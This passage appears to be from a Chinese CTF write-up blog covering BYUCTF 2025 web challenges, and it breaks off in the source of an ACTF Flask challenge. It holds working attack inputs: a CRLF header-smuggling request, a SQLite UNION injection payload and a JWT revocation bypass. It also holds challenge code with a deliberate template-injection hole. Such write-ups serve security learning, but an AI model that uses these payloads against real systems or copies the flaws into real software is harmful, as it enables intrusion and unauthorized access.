language-hh" data-language="hh"><code class="language-hh">LoadModule rewrite_module modules/mod_rewrite.soLoadModule proxy_module modules/mod_proxy.soLoadModule proxy_http_module modules/mod_proxy_http.so&lt;VirtualHost *:80&gt;    ServerName localhost    DocumentRoot /usr/local/apache2/htdocs    RewriteEngine on    RewriteRule "^/name/(.*)" "http://backend:3000/?name=$1" [P]    ProxyPassReverse "/name/" "http://backend:3000/"    RequestHeader unset A    RequestHeader unset a&lt;/VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://j1rry-learn.github.io/posts/ctf%E9%A2%98%E5%9E%8B-http2%E9%99%8D%E7%BA%A7%E8%B5%B0%E7%A7%81/">CTF题型 Http2降级走私原理分析&amp;例题分享 | J1rrY’s Blog</a></p><p><a href="https://blog.csdn.net/qq_44655084/article/details/147650222">https://blog.csdn.net/qq_44655084/article/details/147650222</a></p><p><a href="https://forum.butian.net/share/2180">https://forum.butian.net/share/2180</a></p><p><a href="https://zhuanlan.zhihu.com/p/21659871184">https://zhuanlan.zhihu.com/p/21659871184</a></p><pre class="line-numbers language-none"><code class="language-none">GET /name/2%20HTTP/1.1%0d%0aa:%20admin%0d%0aHost:%20wonka.chal.cyberjousting.com HTTP/2Host: wonka.chal.cyberjousting.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/77e6ea58cf6f003c41e6e1932d27840e.png"></p><p>应该是协议层差异导致的。TTP/1.1 是基于文本的协议，其请求和响应通过简单的换行符（\r\n）分隔。but HTTP/2 是二进制协议，通过帧和流机制传输数据。无法通过注入 \r\n 伪造多个请求，因为每个帧必须符合严格的二进制格式。CVE-2023-25690恰好也是用的HTTP 1.1。查了查HTTP 2走私另有方法（比如把它降级成HTTP1.1）</p><hr><p><a href="https://github.com/BYU-CSA/BYUCTF-2025/blob/main/web/cooking_flask/Writeup.md">https://github.com/BYU-CSA/BYUCTF-2025/blob/main/web/cooking_flask/Writeup.md</a></p><p><a href="https://github.com/BYU-CSA/BYUCTF-2025/tree/main/web/jwtf">https://github.com/BYU-CSA/BYUCTF-2025/tree/main/web/jwtf</a></p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">SELECT something something FROM something something WHERE ('%"``"%')UNION SELECT name,'','','','','','','' from sqlite_master--`"%') something something;SELECT 0,sql,'1960-01-01',3,'4','5','[]',7 FROM sqlite_master WHERE type='table' AND name='user'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>源码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> make_response<span class="token punctuation">,</span> jsonify<span class="token keyword">import</span> jwt<span class="token punctuation">,</span> osapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>FLAG <span class="token operator">=</span> <span class="token string">'flag'</span>APP_SECRET <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ADMIN_SECRET <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'ADMIN_SECRET: </span><span class="token interpolation"><span class="token punctuation">{</span>ADMIN_SECRET<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>jrl <span class="token operator">=</span> <span class="token punctuation">[</span>    jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"admin"</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token string">"uid"</span><span class="token punctuation">:</span> <span class="token string">'1337'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> APP_SECRET<span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">"HS256"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span><span class="token string">'Hello World!'</span><span class="token punctuation">)</span>    resp<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">'session'</span><span class="token punctuation">,</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"admin"</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">}</span><span class="token punctuation">,</span> APP_SECRET<span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">"HS256"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> resp<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/get_admin_cookie'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_admin_cookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    secret <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'adminsecret'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    uid <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'uid'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> secret <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> uid <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> uid <span class="token operator">==</span> <span class="token string">'1337'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> secret <span class="token operator">==</span> ADMIN_SECRET<span class="token punctuation">:</span>        resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span><span class="token string">'Cookie has been set.'</span><span class="token punctuation">)</span>        resp<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">'session'</span><span class="token punctuation">,</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"admin"</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token string">"uid"</span><span class="token punctuation">:</span> uid<span class="token punctuation">}</span><span class="token punctuation">,</span> APP_SECRET<span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">"HS256"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> resp<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    session <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'session'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> session <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token string">'none'</span><span class="token punctuation">)</span>    <span class="token comment"># check if the session is in the JRL</span>    <span class="token keyword">if</span> session <span class="token keyword">in</span> jrl<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token string">'repeating'</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>session<span class="token punctuation">,</span> APP_SECRET<span class="token punctuation">,</span> algorithms<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"HS256"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> payload<span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> FLAG        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token string">'admin.bug'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token string">'try.bug'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/jrl'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">jrl_endpoint</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span>jrl<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">1337</span><span class="token punctuation">,</span> threaded<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们已知一个jrl，关键在于/flag路由如何进行绕过，猜想这就是题目考察的地方<br>如何绕过呢?<br>如果没有删去=,可以在末尾加上=;还有其他方法吗，想起了<em><strong>base64和base64url</strong></em>(二者不可混为一谈)</p><pre class="line-numbers language-none"><code class="language-none">base64编码结果中会有+、/、=三个特殊字符，它们在url中属于特殊字符是直接无法传递的；base64url其实就是把字符中的'+'和'/'分别替换成'-'和'_'，另外把末尾填充的‘=’去掉;其他都一样。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>什么意思<br>/jrl得到<code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwidWlkIjoiMTMzNyJ9.BnBYDobZVspWbxu4jL3cTfri_IxNoi33q-TRLbHV-ew</code><br>我们只需/flag下<code>session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwidWlkIjoiMTMzNyJ9.BnBYDobZVspWbxu4jL3cTfri/IxNoi33q-TRLbHV-ew</code><br>没错，只用_改成/就行</p><p>得到flag</p><p><strong>byuctf{idk_if_this_means_anything_but_maybe_its_useful_somewhere_97ba5a70d94d}</strong></p>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>actf</title>
      <link href="/2025/04/23/actf/"/>
      <url>/2025/04/23/actf/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token punctuation">,</span> json<span class="token punctuation">,</span> time<span class="token keyword">import</span> os<span class="token punctuation">,</span> sys<span class="token punctuation">,</span> binascii<span class="token keyword">from</span> dataclasses <span class="token keyword">import</span> dataclass<span class="token punctuation">,</span> asdict<span class="token keyword">from</span> typing <span class="token keyword">import</span> Dict<span class="token punctuation">,</span> Tuple<span class="token keyword">from</span> secret <span class="token keyword">import</span> KEY<span class="token punctuation">,</span> ADMIN_PASSWORD<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>Padding <span class="token keyword">import</span> pad<span class="token punctuation">,</span> unpad<span class="token keyword">from</span> flask <span class="token keyword">import</span> <span class="token punctuation">(</span>    Flask<span class="token punctuation">,</span>    render_template<span class="token punctuation">,</span>    render_template_string<span class="token punctuation">,</span>    request<span class="token punctuation">,</span>    redirect<span class="token punctuation">,</span>    url_for<span class="token punctuation">,</span>    flash<span class="token punctuation">,</span>    session<span class="token punctuation">,</span><span class="token punctuation">)</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> KEY<span class="token decorator annotation punctuation">@dataclass</span><span class="token punctuation">(</span>kw_only<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">APPUser</span><span class="token punctuation">:</span>    name<span class="token punctuation">:</span> <span class="token builtin">str</span>    password_raw<span class="token punctuation">:</span> <span class="token builtin">str</span>    register_time<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token comment">#  In-memory store for user registration</span>users<span class="token punctuation">:</span> Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> APPUser<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"admin"</span><span class="token punctuation">:</span> APPUser<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">"admin"</span><span class="token punctuation">,</span> password_raw<span class="token operator">=</span>ADMIN_PASSWORD<span class="token punctuation">,</span> register_time<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">def</span> <span class="token function">validate_cookie</span><span class="token punctuation">(</span>cookie<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bool</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> cookie<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        cookie_encrypted <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>cookie<span class="token punctuation">,</span> validate<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> binascii<span class="token punctuation">.</span>Error<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>cookie_encrypted<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        iv<span class="token punctuation">,</span> padded <span class="token operator">=</span> cookie_encrypted<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span> cookie_encrypted<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>KEY<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>        cookie_json <span class="token operator">=</span> cipher<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>padded<span class="token punctuation">)</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        _ <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>cookie_json<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token keyword">def</span> <span class="token function">parse_cookie</span><span class="token punctuation">(</span>cookie<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> Tuple<span class="token punctuation">[</span><span class="token builtin">bool</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> cookie<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">""</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        cookie_encrypted <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>cookie<span class="token punctuation">,</span> validate<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> binascii<span class="token punctuation">.</span>Error<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">""</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>cookie_encrypted<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">""</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        iv<span class="token punctuation">,</span> padded <span class="token operator">=</span> cookie_encrypted<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span> cookie_encrypted<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>KEY<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>        decrypted <span class="token operator">=</span> cipher<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>padded<span class="token punctuation">)</span>        cookie_json_bytes <span class="token operator">=</span> unpad<span class="token punctuation">(</span>decrypted<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>        cookie_json <span class="token operator">=</span> cookie_json_bytes<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">""</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        cookie_dict <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>cookie_json<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">""</span>    <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token punctuation">,</span> cookie_dict<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">generate_cookie</span><span class="token punctuation">(</span>user<span class="token punctuation">:</span> APPUser<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">str</span><span class="token punctuation">:</span>    cookie_dict <span class="token operator">=</span> asdict<span class="token punctuation">(</span>user<span class="token punctuation">)</span>    cookie_json <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>cookie_dict<span class="token punctuation">)</span>    cookie_json_bytes <span class="token operator">=</span> cookie_json<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>    iv <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>    padded <span class="token operator">=</span> pad<span class="token punctuation">(</span>cookie_json_bytes<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>KEY<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>    encrypted <span class="token operator">=</span> cipher<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>padded<span class="token punctuation">)</span>    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>iv <span class="token operator">+</span> encrypted<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> validate_cookie<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"jwbcookie"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"home"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/register"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>        user_name <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> user_name <span class="token keyword">in</span> users<span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">"Username already exists!"</span><span class="token punctuation">,</span> <span class="token string">"danger"</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            users<span class="token punctuation">[</span>user_name<span class="token punctuation">]</span> <span class="token operator">=</span> APPUser<span class="token punctuation">(</span>                name<span class="token operator">=</span>user_name<span class="token punctuation">,</span> password_raw<span class="token operator">=</span>password<span class="token punctuation">,</span> register_time<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span>            flash<span class="token punctuation">(</span><span class="token string">"Registration successful! Please login."</span><span class="token punctuation">,</span> <span class="token string">"success"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"register.html"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> username <span class="token keyword">in</span> users <span class="token keyword">and</span> users<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">.</span>password_raw <span class="token operator">==</span> password<span class="token punctuation">:</span>            resp <span class="token operator">=</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"home"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            resp<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">"jwbcookie"</span><span class="token punctuation">,</span> generate_cookie<span class="token punctuation">(</span>users<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> resp        <span class="token keyword">else</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">"Invalid credentials. Please try again."</span><span class="token punctuation">,</span> <span class="token string">"danger"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"login.html"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/home"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    valid<span class="token punctuation">,</span> current_username <span class="token operator">=</span> parse_cookie<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"jwbcookie"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> valid <span class="token keyword">or</span> <span class="token keyword">not</span> current_username<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"logout"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    user_profile <span class="token operator">=</span> users<span class="token punctuation">.</span>get<span class="token punctuation">(</span>current_username<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> user_profile<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"logout"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> current_username <span class="token operator">==</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"payload"</span><span class="token punctuation">)</span>        html_template <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;    &lt;meta charset="UTF-8"&gt;    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;    &lt;title&gt;Home&lt;/title&gt;    &lt;link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"&gt;    &lt;link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}"&gt;&lt;/head&gt;&lt;body&gt;    &lt;div class="container"&gt;        &lt;h2 class="text-center"&gt;Welcome, %s !&lt;/h2&gt;        &lt;div class="text-center"&gt;            Your payload: %s        &lt;/div&gt;        &lt;img src="{{ url_for('static', filename='interesting.jpeg') }}" alt="Embedded Image"&gt;        &lt;div class="text-center"&gt;            &lt;a href="/logout" class="btn btn-danger"&gt;Logout&lt;/a&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;"""</span> <span class="token operator">%</span> <span class="token punctuation">(</span>            current_username<span class="token punctuation">,</span>            payload<span 